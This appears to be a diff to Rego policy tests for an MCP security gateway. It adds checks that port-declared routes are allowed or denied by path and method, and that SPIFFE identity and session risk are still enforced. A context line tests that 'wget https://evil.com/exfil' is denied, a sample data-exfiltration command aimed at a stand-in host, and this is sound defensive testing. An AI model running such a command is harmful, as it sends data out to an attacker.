@@ -133,6 +133,119 @@ test_destination_denied_bash_wget if {
   not mcp.destination_allowed("bash", {"command": "wget https://evil.com/exfil"})
 }
 
+# --- Port-declared route authorization tests ---
+# These test the generic data-driven mechanism. Port adapters inject
+# data.port_route_authorizations at runtime; the core policy never
+# hardcodes port-specific paths.
+
+mock_port_route_authorizations := [
+  {"path": "/v1/responses", "methods": ["POST"], "auth_model": "model_plane"},
+  {"path_prefix": "/openclaw/webhooks/", "methods": ["POST"], "auth_model": "webhook_inbound"},
+]
+
+test_destination_allowed_port_exact_route if {
+  mcp.destination_allowed("", {}) with input as {
+    "path": "/v1/responses",
+    "method": "POST",
+  }
+    with data.port_route_authorizations as mock_port_route_authorizations
+}
+
+test_destination_denied_port_exact_route_wrong_method if {
+  not mcp.destination_allowed("", {}) with input as {
+    "path": "/v1/responses",
+    "method": "GET",
+  }
+    with data.port_route_authorizations as mock_port_route_authorizations
+}
+
+test_destination_allowed_port_prefix_route if {
+  mcp.destination_allowed("", {}) with input as {
+    "path": "/openclaw/webhooks/whatsapp",
+    "method": "POST",
+  }
+    with data.port_route_authorizations as mock_port_route_authorizations
+}
+
+test_destination_allowed_port_prefix_route_telegram if {
+  mcp.destination_allowed("", {}) with input as {
+    "path": "/openclaw/webhooks/telegram",
+    "method": "POST",
+  }
+    with data.port_route_authorizations as mock_port_route_authorizations
+}
+
+test_destination_denied_port_prefix_route_wrong_method if {
+  not mcp.destination_allowed("", {}) with input as {
+    "path": "/openclaw/webhooks/whatsapp",
+    "method": "GET",
+  }
+    with data.port_route_authorizations as mock_port_route_authorizations
+}
+
+test_destination_denied_unregistered_port_route if {
+  not mcp.destination_allowed("", {}) with input as {
+    "path": "/unknown/port/route",
+    "method": "POST",
+  }
+    with data.port_route_authorizations as mock_port_route_authorizations
+}
+
+# --- Full decision: port routes still enforce SPIFFE/session/principal ---
+
+test_allow_port_route_with_valid_spiffe if {
+  result := mcp.allow with input as {
+    "spiffe_id": "spiffe://poc.local/gateways/mcp-security-gateway/dev",
+    "tool": "",
+    "path": "/v1/responses",
+    "method": "POST",
+    "params": {},
+    "step_up_token": "",
+    "session": {"risk_score": 0.1},
+  }
+    with data.tool_grants as mock_tool_grants
+    with data.tool_registry as mock_tool_registry
+    with data.port_route_authorizations as mock_port_route_authorizations
+
+  result.allow == true
+}
+
+test_deny_port_route_unknown_spiffe if {
+  result := mcp.allow with input as {
+    "spiffe_id": "spiffe://evil.com/attacker",
+    "tool": "",
+    "path": "/v1/responses",
+    "method": "POST",
+    "params": {},
+    "step_up_token": "",
+    "session": {"risk_score": 0.1},
+  }
+    with data.tool_grants as mock_tool_grants
+    with data.tool_registry as mock_tool_registry
+    with data.port_route_authorizations as mock_port_route_authorizations
+
+  result.allow == false
+  result.reason == "no_matching_grant"
+}
+
+test_deny_port_route_high_session_risk if {
+  result := mcp.allow with input as {
+    "spiffe_id": "spiffe://poc.local/gateways/mcp-security-gateway/dev",
+    "tool": "",
+    "path": "/v1/responses",
+    "method": "POST",
+    "params": {},
+    "step_up_token": "",
+    "session": {"risk_score": 0.9},
+  }
+    with data.tool_grants as mock_tool_grants
+    with data.tool_registry as mock_tool_registry
+    with data.port_route_authorizations as mock_port_route_authorizations
+
+  result.allow == false
+  result.reason == "session_risk_too_high"
+}
+
 # --- Messaging destination tests (RFA-np7t) ---
 
 test_destination_allowed_messaging_send if {
